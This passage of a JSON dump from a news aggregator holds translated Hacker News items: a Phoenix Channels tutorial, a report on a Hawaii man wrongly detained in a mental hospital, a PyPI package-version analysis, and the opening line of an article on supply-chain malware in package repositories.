\u9891\u9053\u5185\u7684\u62e6\u622a\u8c03\u7528\u4e2d\u5305\u542b\u4e8b\u4ef6\u540d\u79f0\u3002\n\u8981\u5c06\u6d88\u606f\u63a8\u9001\u5230 handle_out \u65b9\u6cd5\u5185\u90e8\u7684\u5ba2\u6237\u7aef\uff0c\u8bf7\u4f7f\u7528 push \u65b9\u6cd5\u3002\u5f53\u60a8\u5728\u6d4f\u89c8\u5668\u63a7\u5236\u53f0\u4e2d\u52a0\u8f7d\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u60a8\u5c06\u770b\u5230\u5e26\u6709\u989d\u5916\u4fe1\u606f\u7684\u8d1f\u8f7d\u3002\u73b0\u5728\uff0c\u60a8\u4e86\u89e3\u4e86\u4f7f\u7528 Phoenix Channels \u5904\u7406\u63a5\u6536\u3001\u53d1\u9001\u548c\u62e6\u622a\u6d88\u606f\u6240\u9700\u7684\u4e00\u5207\u3002\u5982\u679c\u60a8\u60f3\u4e86\u89e3\u66f4\u591a\u5173\u4e8e\u51e4\u51f0\u9891\u9053\u53ef\u4ee5\u505a\u4ec0\u4e48\uff0c\u90a3\u4e48\u51e4\u51f0\u6587\u6863\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u8d77\u70b9\uff01", "note_en": "Chris McCord showed how  a single Phoenix server could power a million connections. That means a million people send and receive messages in a chat application powered only by a single physical server.\n   You might be more familiar with a typical one-way server request. The client requests information from the server, and the server responds.\n     Websockets allow for direct two-way communication between the client and server. Therefore, for most real-time applications, WebSockets are preferable.\n At any point, the client or the server can send a message to the other. Websockets are the default method of real-time communication in Phoenix.\n  Long polling is another less popular communication protocol for real-time features often used when clients have a poor internet connection. Long polling is a continuous cycle of request and response rather than open two-way communication.\n The client establishes a connection. The connection then remains open until the server times out or responds. The client then reestablishes a connection, and the cycle continues.\n    This allows the server to control when to update the client and benefits clients with poor internet connections.\n &#34;A client can change from WebSocket to long polling if something goes wrong, such as poor network connectivity.&#34; - Pragmatic Programmer\n  Channels are an exciting part of Phoenix that enable soft real-time communication with and between millions of connected clients.\n  Breaking news, like \u201ca goal was scored\u201d or \u201can earthquake is coming\u201d\n   Phoenix channels allow real-time features across many clients. Here\u2019s what that looks like in practice.\n        Phoenix provides everything you need to get started with real-time features. The important pieces to know are the Endpoint, Socket, Topic, and Channel.\n      The endpoint is the boundary where all requests to your web application start. It is also the interface your application provides to the underlying web servers.\n  to provide a wrapper for starting and stopping the endpoint as part of a supervision tree\n  In your Phoenix application in the  endpoint.ex file, you\u2019ll notice the Endpoint sets up the user socket by default. It also sets up a LiveView socket, but we\u2019ll focus on the user socket.\n      By default, Phoenix uses WebSockets instead of long-polling, but it comes with support for both. Notice websockets: true and longpolling: false in the socket method.\n    Sockets must define two callbacks,  connect and  id . These callbacks are used to authenticate and identify socket connections.\n    The socket manages the different channels in your Phoenix application. You can connect a channel under a particular context using the built-in channel method provided by the  Phoenix.Socket module. The channel method takes in two values, the context for messages and the Channel module to handle messages under that context.\n For example, here\u2019s how to connect all messages under the chat context to the  ChatChannel. The asterisk  * is a wildcard. This means the  ChatChannel handles all events under the chat topic.\n             By default, generated channels contain a join method that handles connecting the client to the channel. This join method uses the  authorized? method as a placeholder for any authorization logic that you might want to implement in the future. By default, all join requests are authorized.\n channels use  handle_in methods that handle receiving a message from a client. The first parameter of the  handle_in method is an event name string to pattern match on. The client sends the same event name string so that the channel knows which  handle_in method should handle the incoming message.\n  Phoenix provides a  socket.js file to handle connecting to the server from the client. There you will find some boilerplate code to handle connecting to a channel.\n    Change that code to match your topic and subtopic. This should match the string you used for the channel\u2019s join method.\n        Start your phoenix project using  mix phx.server and open up your browser console (usually f12), and you\u2019ll see that you\u2019re joining successfully.\n                Here\u2019s what that looks like if you add both methods to the  socket.js file.\n        You can intercept messages using the  handle_out method in the Phoenix Channel. You can override values, perform authentication, or add additional information.\n The  handle_out method is triggered whenever the broadcast method is called by the  handle_in method with the same event string. In this case, \u201cshout.\u201d\n You also have to include the event name in an intercept call inside of the Phoenix Channel.\n To push the message to the client inside of the  handle_out method use the push method.\n   When you load the app inside your browser console, you will see the payload with extra information.\n    Now you know everything you need to know to handle receiving, sending, and intercepting messages using Phoenix Channels.\n If you\u2019d like to know more about what you can do with Phoenix Channels, then the  Phoenix Documentation is a great place to start!", "posttime": "2021-08-05 20:56:17", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u51e4\u51f0,phoenix,\u65b9\u6cd5", "title": "\u4f7f\u7528\u51e4\u51f0\u9891\u9053", "title_en": "Use Phoenix Channels", "transed": 1, "url": "https://info.codecast.io/blog/how-to-use-phoenix-channels", "via": "", "real_tags": ["\u51e4\u51f0", "phoenix", "\u65b9\u6cd5"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1071341, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Joshua Spriestersbach \u5728\u88ab\u5173\u62bc\u4e24\u5e74\u96f6\u516b\u4e2a\u6708\u5e76\u88ab\u8feb\u670d\u7528\u7cbe\u795e\u836f\u7269\u540e\u83b7\u91ca \u4e00\u540d\u56e0\u4ed6\u4eba\u72af\u7f6a\u800c\u88ab\u9519\u8bef\u902e\u6355\u5e76\u88ab\u5173\u62bc\u5728\u7cbe\u795e\u75c5\u9662\u8fd1\u4e09\u5e74\u7684\u65e0\u5bb6\u53ef\u5f52\u8005\u88ab\u6084\u6084\u91ca\u653e\uff0c\u6700\u8fd1\u6cd5\u5ead\u590f\u5a01\u5937\u6587\u4ef6\u663e\u793a\u3002\u5728\u5468\u4e00\u665a\u4e0a\u63d0\u4ea4\u7684\u6cd5\u5ead\u8bf7\u613f\u4e66\u4e2d\uff0c\u590f\u5a01\u5937\u65e0\u7f6a\u8ba1\u5212\u8981\u6c42\u6cd5\u5b98\u64a4\u9500\u5bf9\u7ea6\u4e66\u4e9a\u00b7\u65af\u666e\u91cc\u65af\u7279\u65af\u5df4\u8d6b\u7684\u902e\u6355\u5e76\u66f4\u6b63\u4ed6\u7684\u8bb0\u5f55\u3002\u6cd5\u5ead\u6587\u4ef6\u8be6\u7ec6\u63cf\u8ff0\u4e86 Spriestersbach \u7684\u56f0\u5883\uff0c\u59cb\u4e8e 2017 \u5e74\u4ed6\u5728\u6a80\u9999\u5c71\u907f\u96be\u6240\u5916\u7b49\u5f85\u98df\u7269\u65f6\u5728\u4eba\u884c\u9053\u4e0a\u7761\u7740\u4e86\u3002 \u5f53\u4e00\u540d\u8b66\u5bdf\u53eb\u9192\u4ed6\u65f6\uff0cSpriestersbach \u8ba4\u4e3a\u4ed6\u662f\u56e0\u4e3a\u8be5\u5e02\u7981\u6b62\u5750\u4e0b\u6216\u8eba\u4e0b\u800c\u88ab\u6355\u5728\u516c\u5171\u4eba\u884c\u9053\u4e0a\u3002\u5b9e\u9645\u4e0a\uff0c\u8b66\u5b98\u8bef\u8ba4\u4e3a\u4ed6\u662f\u4e00\u4e2a\u540d\u53eb Thomas Castleberry \u7684\u4eba\uff0c\u4ed6\u5728 2006 \u5e74\u56e0\u6bd2\u54c1\u72af\u7f6a\u800c\u88ab\u902e\u6355\u65f6\u6301\u6709\u672a\u5b8c\u6210\u7684\u902e\u6355\u4ee4\u3002\u6839\u636e\u590f\u5a01\u5937\u7eaf\u771f\u8ba1\u5212\uff0cSpriestersbach \u548c Castleberry \u4ece\u672a\u89c1\u8fc7\u9762\uff0cSpriestersbach \u4e5f\u4ece\u672a\u58f0\u79f0\u81ea\u5df1\u662f Castleberry\u3002 Spriestersbach \u7684\u5f8b\u5e08\u8fa9\u79f0\uff0c\u5982\u679c\u8b66\u65b9\u7b80\u5355\u5730\u6bd4\u8f83\u4e24\u4eba\u7684\u6307\u7eb9\u548c\u7167\u7247\uff0c\u5c31\u53ef\u4ee5\u907f\u514d\u6df7\u6dc6\u3002\u76f8\u53cd\uff0c\u590f\u5a01\u5937\u5b98\u5458\u5c06 Spriestersbach \u5173\u5728\u590f\u5a01\u5937\u5dde\u7acb\u533b\u9662\u8fd1\u4e09\u5e74\uff0c\u5e76\u5f3a\u8feb\u4ed6\u670d\u7528\u7cbe\u795e\u836f\u7269\u3002 2020 \u5e74 1 \u6708\uff0c\u5b98\u5458\u4eec\u610f\u8bc6\u5230\u4ed6\u4eec\u7684\u9519\u8bef\uff0c\u6084\u6084\u91ca\u653e\u4e86\u4ed6\uff0c\u5e76\u4ee5 50 \u7f8e\u5206\u7684\u540d\u4e49\u91ca\u653e\u4e86\u4ed6\u3002 \u201cSpriestersbach \u5148\u751f\u8d8a\u662f\u901a\u8fc7\u65ad\u8a00\u4ed6\u4e0d\u662f Castleberry \u5148\u751f\u6765\u8868\u8fbe\u4ed6\u7684\u6e05\u767d\uff0cHSH \u7684\u5de5\u4f5c\u4eba\u5458\u548c\u533b\u751f\u5c31\u8d8a\u8ba4\u4e3a\u4ed6\u6709\u5984\u60f3\u548c\u7cbe\u795e\u75c5\uff0c\u5e76\u4e14\u670d\u7528\u4e86\u5927\u91cf\u836f\u7269\uff0c\u201d\u8bf7\u613f\u4e66\u8bf4\u3002 \u201c\u6ca1\u6709\u4eba\u4f1a\u76f8\u4fe1\u4ed6\u6216\u91c7\u53d6\u4efb\u4f55\u6709\u610f\u4e49\u7684\u6b65\u9aa4\u6765\u9a8c\u8bc1\u4ed6\u7684\u8eab\u4efd\u5e76\u786e\u5b9a Spriestersbach \u5148\u751f\u8bf4\u7684\u662f\u5b9e\u8bdd\u2014\u2014\u4ed6\u4e0d\u662f Castleberry \u5148\u751f\uff0c\u201d\u5b83\u8865\u5145\u8bf4\u3002\n\u5728\u4e24\u5e74\u96f6\u516b\u4e2a\u6708\u7684\u65f6\u95f4\u91cc\uff0c\u533b\u9662\u5de5\u4f5c\u4eba\u5458\u548c Spriestersbach \u81ea\u5df1\u7684\u516c\u8bbe\u8fa9\u62a4\u4eba\u62d2\u7edd\u76f8\u4fe1\u4ed6\uff0c\u76f4\u5230\u533b\u9662\u7684\u7cbe\u795e\u79d1\u533b\u751f\u6700\u7ec8\u542c\u53d6\u4e86\u4ed6\u7684\u610f\u89c1\u3002\u6839\u636e\u6cd5\u5ead\u6587\u4ef6\uff0c\u5f53\u5361\u65af\u5c14\u4f2f\u91cc\u6700\u521d\u88ab\u6355\u65f6\uff0c\u4ed6\u53ea\u9700\u8981\u901a\u8fc7\u8c37\u6b4c\u641c\u7d22\u548c\u7535\u8bdd\u786e\u8ba4\u4ed6\u5728\u53e6\u4e00\u4e2a\u5c9b\u4e0a\u3002\u590f\u5a01\u5937\u65e0\u7f6a\u8ba1\u5212\u6279\u8bc4\u4e86\u8b66\u5bdf\u3001\u5dde\u516c\u8bbe\u8fa9\u62a4\u4eba\u529e\u516c\u5ba4\u3001\u5dde\u68c0\u5bdf\u957f\u548c\u5dde\u533b\u9662\uff0c\u79f0\u5404\u65b9\u201c\u90fd\u5e94\u4e3a\u8fd9\u4e00\u4e25\u91cd\u7684\u53f8\u6cd5\u4e0d\u516c\u8d1f\u8d23\u201d\u3002", "note_en": "Joshua Spriestersbach was released after being locked up for two years and eight months and forced to take psychiatric drugs\n    A homeless man wrongly arrested for a crime committed by someone else and locked up in a mental health hospital for nearly three years was quietly released, recent court documents in  Hawaii show.\n In a court petition filed on Monday night, the Hawaii Innocence Project asked a judge to rescind Joshua Spriestersbach\u2019s arrest and correct his records. The court filings detail Spriestersbach\u2019s plight, which started when he fell asleep on a sidewalk while waiting for food outside a Honolulu shelter in 2017.\n  When a police officer woke him up, Spriestersbach thought he was being arrested for the city\u2019s ban on sitting or lying down on public sidewalks. In reality, the officer mistook him for a man named Thomas Castleberry, who had an outstanding warrant from a 2006 arrest for drug crimes.\n According to the Hawaii Innocence Project, Spriestersbach and Castleberry had never met and Spriestersbach had never claimed to be Castleberry.\n Spriestersbach\u2019s lawyers argue that the mixup could have been avoided if police had simply compared the two men\u2019s fingerprints and photographs. Instead, Hawaii officials locked Spriestersbach in the Hawaii State Hospital for nearly three years and forced him to take psychiatric drugs. In January 2020, officials realized their mistake and quietly released him, with 50 cents to his name.\n \u201cThe more Mr. Spriestersbach vocalized his innocence by asserting that he is not Mr Castleberry, the more he was declared delusional and psychotic by the HSH staff and doctors and heavily medicated,\u201d the petition  said. \u201cNo one would believe him or take any meaningful steps to verify his identity and determine that Mr. Spriestersbach was telling the truth \u2013 he was not Mr Castleberry,\u201d it added.\n For two years and eight months, hospital staff and Spriestersbach\u2019s own public defenders refused to believe him, until a hospital psychiatrist finally listened.  According to the court document, all it took were a few Google searches and phone calls to confirm that he was on another island when Castleberry was initially arrested.\n  The Hawaii Innocence Project criticized the police, state public defender\u2019s office, state attorney general and the state hospital,  stating that all parties \u201cshare in the blame for this gross miscarriage of justice\u201d.", "posttime": "2021-08-05 20:56:04", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u8eab\u4efd,arrested,spriestersbach", "title": "\u7537\u5b50\u56e0\u8eab\u4efd\u9519\u8bef\u88ab\u6355\u5165\u72f1\u4e24\u5e74", "title_en": "Man arrested in mistaken identity case locked in mental hospital for two years", "transed": 1, "url": "https://www.theguardian.com/us-news/2021/aug/04/hawaii-man-mistaken-identity-case-mental-hospital-two-years", "via": "", "real_tags": ["\u8eab\u4efd", "arrested"]}, {"category": "", "categoryclass": "", "imagename": "27654285c5d03d3ce7174426613e664b.png", "infoid": 1071340, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6807\u9898\u662f\u5bf9\u4f18\u79c0 Python Package Index \u4e2d\u6700\u5e38\u88ab\u9057\u5fd8\u7684\u6635\u79f0\u7684\u5f15\u7528\u2014\u2014\u5976\u916a\u5e97\u2014\u2014\u5b83\u6307\u7684\u662f Monty Python Cheese Shop \u8349\u56fe\u3002\u6211\u7ecf\u5e38\u53d1\u73b0\u81ea\u5df1\u76ef\u7740 piwheels \u76d1\u89c6\u5668\uff0c\u5076\u5c14\u4f1a\u5f39\u51fa\u4e00\u4e2a\u5947\u602a\u7684\u5305\u540d\u6216\u5f02\u5e38\u957f\u7684\u7248\u672c\u53f7\uff1a\u6211\u6700\u8fd1\u505a\u4e86\u5f88\u591a\u5ba1\u8ba1 piwheels \u4e0e PyPI\uff0c\u786e\u4fdd\u6211\u4eec\u6709\u6b63\u786e\u7684\u5305\u548c\u7248\u672c\u96c6\uff0c\u4fee\u526a\u672c\u5e94\u5220\u9664\u7684\u5185\u5bb9\u5e76\u6dfb\u52a0\u4efb\u4f55\u4ee5\u67d0\u79cd\u65b9\u5f0f\u88ab\u9057\u6f0f\u7684\u5185\u5bb9\u3002\u6211\u9047\u5230\u4e86\u5f88\u591a\u6709\u8da3\u7684\u602a\u4e8b\uff0c\u6240\u4ee5\u6211\u60f3\u6211\u4f1a\u505a\u4e00\u4e9b\u5206\u6790\u548c\u63a2\u7d22\uff0c\u5e76\u5728\u8fd9\u91cc\u5206\u4eab\u7ed3\u679c\u3002\u4ee5\u4e0b\u5206\u6790\u662f\u524d\u51e0\u5929\u4ecePyPI\u5f97\u5230\u7684\u4e00\u7ec4\u5305\u548c\u7248\u672c\uff0c\u5f53\u65f6\u6709\uff1a \u6700\u4e0d\u5e38\u89c1\u7684\u5305\u540d\u957f\u5ea6\u4e3a72, 73, 74, 75, 80, 82, 83, 90, 92 \u2014\u2014\u6240\u6709\u8fd9\u4e9b\u90fd\u53d1\u751f\u4e00\u6b21\u3002\u5305\u540d\u6700\u5e38\u89c1\u7684\u8d77\u59cb\u5b57\u7b26\u662f p (14%)\uff0c\u56e0\u4e3a\u5f88\u591a\u5305\u88ab\u547d\u540d\u4e3a\u201cpy\u201d-something \u6216\u201cpython\u201d-something\u3002\u5176\u6b21\u662f d (9%) \u7531\u4e8e\u201cdjango-\u201d\u5305\u3002\u5176\u4f59\u5b57\u7b26\u96c6\u7684\u5206\u5e03\u662f\uff1a \u67e5\u770b\u524d\u4e24\u4e2a\u5b57\u7b26\uff0c\u6700\u5e38\u89c1\u7684\u662f py\u3001dj\u3001od\u3001co \u548c re\uff1a\n\u672c\u798f\u5fb7\u5b9a\u5f8b\u6307\u51fa\uff0c\u5728\u8bb8\u591a\u81ea\u7136\u53d1\u751f\u7684\u6570\u5b57\u96c6\u5408\u4e2d\uff0c\u524d\u5bfc\u6570\u5b57\u53ef\u80fd\u5f88\u5c0f\uff0c\u56e0\u6b64\u6bcf\u4e2a\u540e\u7eed\u6570\u5b57\u7684\u5206\u5e03\u4e0d\u592a\u53ef\u80fd\u3002\u6211\u60f3\u77e5\u9053\u8fd9\u662f\u5426\u53ef\u4ee5\u5728\u5305\u7248\u672c\u53f7\u4e2d\u770b\u5230\u3002\u53d6\u6570\u5b57\u7248\u672c\uff0c\u5e76\u67e5\u770b\u7b2c\u4e00\u4e2a\u975e\u96f6\u6570\u5b57\uff0c\u8be5\u5206\u5e03\u5408\u7406\u5730\u7b26\u5408 Benford \u5b9a\u5f8b\uff1a\u7136\u800c\uff0c\u67e5\u770b\u6240\u6709\u6570\u5b57\uff08\u4e0d\u4ec5\u4ec5\u662f\u7b2c\u4e00\u4e2a\uff09\u7684\u5206\u5e03\uff0c\u8fd9\u4e0e Benford \u5b9a\u5f8b\u63d0\u51fa\u7684\u6a21\u5f0f\u975e\u5e38\u76f8\u4f3c\u66f4\u63a5\u8fd1\uff1a\u5728\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c1 \u6bd4\u9884\u671f\u66f4\u5e38\u89c1\uff0c2 \u4f3c\u4e4e\u5b8c\u5168\u5bf9\u9f50\uff0c\u4f46 9 \u6bd4\u9884\u671f\u7a0d\u5fae\u66f4\u5e38\u89c1\uff0c\u5728\u7b2c\u4e00\u4e2a\u6570\u5b57\u793a\u4f8b\u4e2d\u66f4\u662f\u5982\u6b64\u3002\u6211\u6392\u9664\u4e86\u6ca1\u6709\u7248\u672c\u7684\u5305\uff08\u56e0\u4e3a\u5b83\u4eec\u5728 PyPI \u4e0a\u6ca1\u6709 JSON \u7aef\u70b9\uff09\u3002\u81f3\u4e8e\u5176\u4f59\u7684\uff0c\u8d85\u8fc7\u56db\u5206\u4e4b\u4e00\u53ea\u6709\u4e00\u4e2a\u7248\u672c\u3002\u968f\u7740\u7248\u672c\u6570\u91cf\u7684\u589e\u52a0\uff0c\u9891\u7387\u7a33\u6b65\u4e0b\u964d\uff1aPyPI \u5305\u7248\u672c\u4e0d\u5fc5\u662f\u4e25\u683c\u7684\u6570\u5b57\u2014\u2014\u5b83\u4eec\u901a\u5e38\u91c7\u7528 1.2.3 \u6216\u7c7b\u4f3c\u7684\u5f62\u5f0f\uff0c\u6709\u65f6\u9644\u52a0\u5b57\u7b26\u4ee5\u8868\u793a alpha\u3001beta\u3001dev \u6216 release\u5019\u9009\uff0c\u4f46\u5b83\u4eec\u53ef\u4ee5\u662f\u4efb\u4f55\u5b57\u7b26\u4e32\u3002\u6700\u957f\u7684\u7248\u672c\u662f\u5305lyricsprocessor\u7684\u4e00\u4e2a\u7248\u672c\uff0c\u5177\u6709\u7248\u672c\u53f70.1.40404040404040404040404040404040404040404040404040404040404040404040404040404040\uff0884\u4e2a\u5b57\u7b26\uff09\u7684\u4e0b\u4e00\u4e2a\u6700\u957f\u7684\u90fd\u6765\u81ea\u5305softwarefabrica-django\u7684-utils\u7684\u6392\u5b83\u5177\u670970\u4e2a\u5b57\u7b26\u7684\u7248\u672c\u4f8b\u59821.0dev-BZR-R115-panta- elasticworld.org-20100520155735-sf3yrsr0pvyvlm8m\n\u5728 PyPI \u7684\u5386\u53f2\u4e0a\uff0c\u6709\u4eba\u4e0d\u5c0f\u5fc3\u63d0\u4ea4\u4e86\u4ed6\u4eec\u5305\u7684\u63cf\u8ff0\u4f5c\u4e3a\u7248\u672c\u540d\u79f0\uff0c\u6240\u4ee5\u6709\u4e00\u4e2a\u5305 sysv-ipc \u7684\u7248\u672c\u53eb\u505a\uff1aSysv_ipc \u5141\u8bb8 Python \u7a0b\u5e8f\u8bbf\u95ee System V \u4fe1\u53f7\u91cf\u3001\u5171\u4eab\u5185\u5b58\u548c\u6d88\u606f\u961f\u5217\u3002\u5927\u591a\u6570\uff08\u5168\u90e8\uff1f\uff09Unix\uff08\u5305\u62ec OS X\uff09\u652f\u6301 System V IPC\u3002 Windows+Cygwin 1.7 \u4e5f\u53ef\u80fd\u5de5\u4f5c\u3002\u5305\u542b\u793a\u4f8b\u4ee3\u7801\u3002\u6b64\u6269\u5c55\u5728 GPL \u4e0b\u53d1\u5e03\u3002\u60a8\u53ef\u80fd\u8fd8\u5bf9\u7c7b\u4f3c\u7684 POSIX IPC \u6a21\u5757\u611f\u5174\u8da3\uff1ahttp://semanchuk.com/philip/posix_ipc/ \u5176\u4ed6\u65f6\u5019\u8fd9\u79cd\u4e8b\u60c5\u662f\u5076\u7136\u53d1\u751f\u7684\uff0c\u5305\u62ec\u7b2c\u4e00\u4e2a\u7248\u672c\u7684 omnijson\uff0c\u5b83\u88ab\u79f0\u4e3a\u201cKenneth Reitz\u201d\u5e76\u4e14\u662f\u8fd8\u6d3b\u7740\uff1a\u6211\u6700\u8fd1\u6ce8\u610f\u5230\u4e00\u4e2a\u7248\u672c\u7684\u672b\u5c3e\u4f3c\u4e4e\u6709\u7a7a\u683c\uff0c\u7136\u540e\u770b\u770b\u662f\u5426\u8fd8\u6709\u5176\u4ed6\u7248\u672c\u3002 PyPI \u4e0a\u6709 16 \u4e2a\u4ee5\u6362\u884c\u7b26\u7ed3\u5c3e\u7684\u7248\u672c\u3002\u5728\u8fd9 16 \u4e2a\u4e2d\uff0c\u6709 12 \u4e2a\u4e5f\u6ce8\u518c\u4e86\u5265\u79bb\u7684\u7b49\u6548\u9879\uff1a\u7531\u4e8e\u7248\u672c\u53f7\u5f80\u5f80\u662f\u6570\u5b57\uff0c\u56e0\u6b64\u6700\u6709\u8da3\u7684\u80af\u5b9a\u662f\u90a3\u4e9b\u6ca1\u6709\u4efb\u4f55\u6570\u5b57\u7684\u7248\u672c\u3002\u7531\u4e8e\u8be5\u7248\u672c\u5728\u5176\u53d1\u884c\u7248\u4e2d\u5305\u542b\u4e00\u4e2a tarball\uff0c\u60a8\u53ef\u4ee5\u68c0\u67e5\u6b64\u4e8b\u6545\u662f\u5982\u4f55\u53d1\u751f\u7684\u3002\u8bb8\u591a\u7528\u4e8e\u8ba1\u7b97\u7248\u672c\u53f7\u7684\u590d\u6742\u4ee3\u7801\u2026\u2026\u51fa\u9519\u4e86\u3002\u7248\u672c\u5b57\u7b26\u4e32\u5b9e\u9645\u4e0a\u662f Version \u7c7b\u7684\u4ee3\u8868\uff0c\u800c\u4e0d\u662f\u5b9e\u4f8b\u7684\u5b57\u7b26\u4e32\u8868\u793a\uff0c\u6b63\u5982\u9884\u671f\u7684\u90a3\u6837\u3002\u901a\u5e38\u5b83\u4f1a\u663e\u793a\u4e3a &lt;__class__.jw.util.version.Version&gt; \u4f46\u5b83\u5df2\u88ab\u89c4\u8303\u5316\uff0c\u7528\u5355\u4e2a\u8fde\u5b57\u7b26\u66ff\u6362\u5c16\u62ec\u53f7\u548c\u53cc\u4e0b\u5212\u7ebf\u3002\u6709\u8da3\u7684\u662f\uff08\u5982\u679c\u4f60\u5df2\u7ecf\u505a\u5230\u4e86\u8fd9\u4e00\u70b9\uff0c\u6211\u8ba4\u4e3a\u4f60\u662f\u90a3\u79cd\u4f1a\u89c9\u5f97\u8fd9\u5f88\u6709\u8da3\u7684\u4eba\uff09\uff0c\u5728\u5177\u6709\u975e\u6570\u5b57\u7248\u672c\u7684 166 \u4e2a\u8f6f\u4ef6\u5305\u4e2d\uff0c\u9664\u4e86\u4e94\u4e2a\u4e4b\u5916\uff0c\u6240\u6709\u8f6f\u4ef6\u5305\u90fd\u53ea\u6709\u4e00\u4e2a\u975e\u6570\u5b57\u7248\u672c\u7248\u672c\uff0c\u800c\u8fd9\u4e94\u4e2a\u7248\u672c\u5404\u53ea\u6709\u4e24\u4e2a\u8fd9\u6837\u7684\u7248\u672c\u3002\u90a3\u4e9b\u662f\uff1a\n\u60a8\u53ef\u4ee5\u5728 GitHub \u4e0a\u67e5\u770b\u7b14\u8bb0\u672c\u4ee5\u4e86\u89e3\u56f4\u7ed5\u6b64\u5206\u6790\u7684\u5de5\u4f5c\uff0c\u5305\u62ec\u6211\u5982\u4f55\u4f7f\u7528 XMLRPC \u548c JSON API \u4ece PyPI \u83b7\u53d6\u6570\u636e\u3002", "note_en": "The title is a reference to the mostly forgotten nickname of the excellent  Python Package Index \u2014  Cheese Shop \u2014 which refers to the Monty Python  Cheese Shop sketch.\n I often find myself staring at the piwheels monitor, and occasionally a strange package name or an unusually longer version number pops up:\n  I\u2019ve been doing a lot of auditing piwheels vs PyPI lately, making sure we have the right set of packages and versions, pruning stuff that should have been deleted and adding in any that somehow got missed. And I came across lots of interesting oddities, so I thought I\u2019d do some analysis and exploration and share the results here.\n The following analysis is of a set of packages and version obtained from PyPI a few days ago, and at the time there were:\n     The least common package name lengths are  72,  73,  74,  75,  80,  82,  83,  90,  92 \u2014 all of which occur once.\n      The most common starting character for a package name is  p (14%), due to lots of packages being named \u201cpy\u201d-something or \u201cpython\u201d-something. Second is  d (9%) due to \u201cdjango-\u201d packages. The distribution for the rest of the character set is:\n    Looking at the first two characters, the most common are  py,  dj,  od,  co and  re:\n     Benford\u2019s Law states that in many naturally occurring collections of numbers, the leading digit is likely to be small, and hence the distribution of each subsequent digit is less likely. I wondered if this could be seen within package version numbers. Taking the numeric versions, and looking at the first non-zero digit, the distribution is reasonably compliant with Benford\u2019s Law:\n  However, looking at the distribution of all digits (not just the first), this follows the pattern laid out by Benford\u2019s Law much more closely:\n  In both cases, 1 is more common that expected, 2 seems to be perfectly aligned, but 9 is slightly more common than expected, more so in the first digit example.\n  I excluded packages which had no versions (because they don\u2019t have JSON endpoints on PyPI). As for the rest of them, over a quarter only have a single version. The frequency drops steadily as the number of versions rises:\n    A PyPI package version doesn\u2019t have to be strictly numeric \u2013 they\u2019re usually in the form 1.2.3 or similar, sometimes with characters appended to indicate alpha, beta, dev or release candidate, but they can be  any string.\n The longest version is a version of package   lyricsprocessor, with the version number   0.1.40404040404040404040404040404040404040404040404040404040404040404040404040404040 (84 chars)\n The next longest are all from package   softwarefabrica-django-utils which exclusively has versions of 70 characters e.g.   1.0dev-BZR-r115-panta-elasticworld.org-20100520155735-sf3yrsr0pvyvlm8m\n   At one point in PyPI\u2019s history, someone accidentally submitted the description of their package as the version name, so there was a version of package   sysv-ipc called:\n Sysv_ipc gives Python programs access to System V semaphores, shared memory and message queues. Most (all?) Unixes (including OS X) support System V IPC. Windows+Cygwin 1.7 might also work. Sample code is included.This extension is released under the GPL. You might also be interested in the similar POSIX IPC module at: http://semanchuk.com/philip/posix_ipc/\n   Other times this kind of thing has happened by accident include the first version of   omnijson which was called \u201c  Kenneth Reitz\u201d and is still live:\n   I recently noticed a version which seemed to have whitespace at the end of it, and had a look to see if there were others. There are 16 versions on PyPI which end in a newline character. Of these 16, 12 have registered the stripped equivalent too:\n     Since version numbers tend to be numeric, surely the most interesting ones are those without any numbers in them.\n    Since the version included a tarball in its  release, you can inspect how this accident occurred. Lots of complicated code for calculating what the version number should be \u2026 gone wrong. The version string is actually the  repr of the Version class, not the string representation of the instance, as intended. Normally it would appear as  &lt;__class__.jw.util.version.Version&gt; but it\u2019s been canonicalised, replacing the angle brackets and double underscores with single hyphens.\n Interestingly (if you\u2019ve made it this far, I think you\u2019re the kind of person who\u2019ll find this interesting), of the 166 packages with non-numeric versions, all but five of them have only a single non-numeric version, and those five only have two such versions each. Those are:\n     You can view the notebook to see the workings around this analysis on   GitHub, including how I obtained the data from PyPI using the XMLRPC and JSON APIs.", "posttime": "2021-08-05 20:55:35", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "shop,cheese,\u7248\u672c", "title": "Cheese Shop \u83dc\u5355\u7684\u5916\u76ae", "title_en": "The rinds of the Cheese Shop menu", "transed": 1, "url": "https://blog.piwheels.org/the-rinds-of-the-cheese-shop-menu/", "via": "", "real_tags": ["shop", "cheese", "\u7248\u672c"]}, {"category": "", "categoryclass": "", "imagename": "da72ed83418b9eaef7e64f16d3dcedf0.png", "infoid": 1071339, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8f6f\u4ef6\u5305\u5b58\u50a8\u5e93\u6b63\u5728\u6210\u4e3a\u4f9b\u5e94\u94fe\u653b\u51fb\u7684\u70ed\u95e8\u76ee\u6807\u3002\u6700\u8fd1\uff0c\u6709\u5173\u4e8e\u6076\u610f\u8f6f\u4ef6\u653b\u51fb npm\u3001PyPI \u548c RubyGems \u7b49\u6d41\u884c\u5b58\u50a8\u5e93\u7684\u6d88\u606f\u3002\u5f00\u53d1\u4eba\u5458\u76f2\u76ee\u5730\u4fe1\u4efb\u5b58\u50a8\u5e93\u5e76\u4ece\u8fd9\u4e9b\u6765\u6e90\u5b89\u88c5\u8f6f\u4ef6\u5305\uff0c\u5047\u8bbe\u5b83\u4eec\u662f\u5b89\u5168\u7684\u3002\u6709\u65f6\u5141\u8bb8\u5c06\u6076\u610f\u8f6f\u4ef6\u5305\u4e0a\u4f20\u5230\u5305\u5b58\u50a8\u5e93\uff0c\u4f7f\u6076\u610f\u884c\u4e3a\u8005\u6709\u673a\u4f1a\u4f7f\u7528\u5b58\u50a8\u5e93\u5206\u53d1\u75c5\u6bd2\u5e76\u5bf9\u7ba1\u9053\u4e2d\u7684\u5f00\u53d1\u4eba\u5458\u548c CI/CD 